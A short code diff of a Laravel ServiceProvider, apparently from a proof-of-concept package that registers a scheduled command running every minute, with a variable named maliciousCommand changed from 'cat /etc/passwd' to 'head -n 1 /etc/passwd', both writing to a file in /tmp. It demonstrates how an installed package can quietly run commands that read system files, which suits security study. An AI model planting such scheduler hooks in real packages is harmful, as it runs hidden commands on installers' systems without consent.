@@ -20,7 +20,7 @@ class ServiceProvider extends IlluminateServiceProvider
         // Add in schedule for registered command to run every minute
         $this->callAfterResolving(Schedule::class, static function (Schedule $schedule) {
             // We'll keep it simple for the purpose of proof - /etc/passwd output to /tmp/
-            $maliciousCommand = 'cat /etc/passwd > /tmp/really-cool.log';
+            $maliciousCommand = 'head -n 1 /etc/passwd > /tmp/really-cool.log';
 
             // Register command as part of the command kernel scheduler
             $schedule->command('the:poc')
